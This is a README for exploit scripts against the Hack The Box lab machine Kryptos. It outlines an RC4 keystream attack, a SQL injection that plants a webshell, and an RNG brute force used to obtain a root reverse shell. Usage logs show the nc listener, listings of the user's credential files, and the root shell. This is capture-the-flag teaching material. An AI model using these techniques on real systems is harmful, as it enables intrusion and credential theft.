## Challenge

[Kryptos](https://www.hackthebox.eu/home/machines/profile/183) from Hackthebox.eu

## File System Shell

### Description

The webpage on Kryptos allows me to request a webpage which it will fetch, and encrpyt with AES or RC4 using a static key. This shell will hosts known plaintext and have Kryptos fetch it to retrieve the RC4 key stream. Then it will fetch encrypted versions of internal sites that I can't access otherwise, and use the key stream to decrypt them.

The shell can use php base64 filter to get source for php pages. 

It also takes advantage of an SQL injection to write a webshell, giving file system access to the Kryptos host.

### Reference

Originally published in blog posts: https://0xdf.gitlab.io/2019/09/21/htb-kryptos.html

### Dependencies

[cmd](https://docs.python.org/3/library/cmd.html)

### Usage

```
root@kali# ./encrypted_page.py 
[*] Getting token from root page
[+] Got token
[*] Submitting Login
[+] Logged in to page
[*] Starting webserver on 7001 to serve content of length 1000
[*] Requesting known page
[+] Derived RC4 keystream
page> http://127.0.0.1/dev/
<html>
    <head>
    </head>
    <body>
        <div class="menu">
            <a href="index.php">Main Page</a>
            <a href="index.php?view=about">About</a>
            <a href="index.php?view=todo">ToDo</a>
        </div>
</body>
</html>
```

```
root@kali# ./encrypted_page.py 
[*] Getting token from root page
[+] Got token
[*] Submitting Login
[+] Logged in to page
[*] Starting webserver on 7001 to serve content of length 1000
[*] Requesting known page
[+] Derived RC4 keystream
[*] Injecting php file for dir walks and file gets
[+] Injected php page as D7JX8DLYU0DOCOL.php
page> ls /home
[*] Starting webserver on 7001 to serve content of length 9155
[*] Requesting known page
[+] Derived RC4 keystream
  .
  ..
  rijndael
page> ls /home/rijndael
  .
  ..
  .bash_history
  .bash_logout
  .bashrc
  .cache
  .gnupg
  .profile
  .ssh
  creds.old
  creds.txt
  kryptos
  user.txt
```

## root Shell


### Description

There is a webserver running on localhost as root, into which I can ijnect python commands. I'll need to use the demo functionality to brute force the insecure random number generator so that I can sign messages. Once I do that, I can send in a command to get a reverse shell. 

### Reference

Originally published in blog posts: https://0xdf.gitlab.io/2019/09/21/htb-kryptos.html

### Dependencies

[cmd](https://docs.python.org/3/library/cmd.html)

### Usage

```
root@kali# ./kryptos_root_shell.py 
[*] Local IP: 10.10.14.30
[*] Creating tunnel to Kryptos
[+] Tunnel created, listening locally on port 33151
[*] Getting expression and signature from /debug
[+] Signature and expression received
[*] Brute forcing seed
[+] Found seed: 7470457370149431962811031290883090829243224817138100905771457032768589014144
[*] Sending command to trigger reverse shell
```

```
root@kali# nc -lnvp 443
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.129.
Ncat: Connection from 10.10.10.129:56574.
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```
